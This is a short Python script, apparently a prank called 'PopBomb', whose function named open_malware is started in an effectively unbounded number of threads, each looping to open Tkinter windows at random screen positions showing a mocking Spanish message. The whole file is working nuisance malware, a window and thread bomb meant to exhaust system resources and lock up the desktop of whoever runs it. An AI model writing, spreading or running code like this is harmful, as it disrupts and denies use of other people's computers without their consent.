import tkinter as tk
import sys
import threading
import time
import random

maxWindows = sys.maxsize
running = True

def open_malware():
    global running
    while running:
        root = tk.Tk()
        root.title("PopBomb")
        root.minsize(300, 300)
        root.maxsize(300, 300)
        label = tk.Label(root, text="PRINGAO JAJAJAJAJAJAJA", font=("Comic Sans MS", 12, "bold"))
        label.pack(expand=True, fill='both', padx=20, pady=20)
        x = random.randint(0, root.winfo_screenwidth() - 200)  
        y = random.randint(0, root.winfo_screenheight() - 200) 
        root.geometry(f"100x100+{x}+{y}")
        root.mainloop()


for i in range(1,maxWindows):
    keyboard_thread = threading.Thread(target=open_malware)
    keyboard_thread.start()



